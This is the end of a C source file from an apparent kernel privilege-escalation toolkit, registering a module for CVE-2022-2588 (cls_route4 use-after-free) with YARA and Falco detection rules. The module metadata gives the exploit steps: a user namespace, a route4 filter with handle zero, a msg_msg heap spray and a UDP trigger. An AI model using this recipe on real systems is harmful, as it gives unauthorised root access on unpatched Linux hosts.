    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $tag = \"SKELETONKEY4\" ascii\n"
    "        $log = \"/tmp/skeletonkey-cls_route4.log\" ascii\n"
    "    condition:\n"
    "        any of them\n"
    "}\n";

static const char cls_route4_falco[] =
    "- rule: tc route4 filter manipulation by non-root in userns\n"
    "  desc: |\n"
    "    Non-root tc qdisc + route4 filter add/delete inside a userns\n"
    "    + UDP sendto trigger. CVE-2022-2588 dead-UAF pattern. False\n"
    "    positives: legitimate traffic shaping inside rootless\n"
    "    containers.\n"
    "  condition: >\n"
    "    evt.type = sendto and fd.sockfamily = AF_INET and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    UDP sendto on dummy iface from non-root\n"
    "    (user=%user.name pid=%proc.pid)\n"
    "  priority: HIGH\n"
    "  tags: [network, mitre_privilege_escalation, T1068, cve.2022.2588]\n";

const struct skeletonkey_module cls_route4_module = {
    .name           = "cls_route4",
    .cve            = "CVE-2022-2588",
    .summary        = "net/sched cls_route4 handle-zero dead UAF → kernel R/W",
    .family         = "cls_route4",
    .kernel_range   = "2.6.39 ≤ K, fixed mainline 5.20; backports: 5.4.213 / 5.10.143 / 5.15.69 / 5.18.18 / 5.19.7",
    .detect         = cls_route4_detect,
    .exploit        = cls_route4_exploit,
    .mitigate       = NULL,    /* mitigation: blacklist cls_route4 module OR disable user_ns */
    .cleanup        = cls_route4_cleanup,
    .detect_auditd  = cls_route4_auditd,
    .detect_sigma   = cls_route4_sigma,
    .detect_yara    = cls_route4_yara,
    .detect_falco   = cls_route4_falco,
    .opsec_notes    = "unshare(CLONE_NEWUSER|CLONE_NEWNET); ip link/addr/route to make a dummy interface, htb qdisc + class + route4 filter with handle 0, delete filter (leaves dangling tcf_proto pointer), msg_msg spray kmalloc-1k tagged 'SKELETONKEY4', UDP sendto to trigger classify(). Writes /tmp/skeletonkey-cls_route4.log. Audit-visible via unshare + sendto(AF_INET) + msgsnd. Cleanup callback removes /tmp log + dummy interface.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_cls_route4(void)
{
    skeletonkey_register(&cls_route4_module);
}
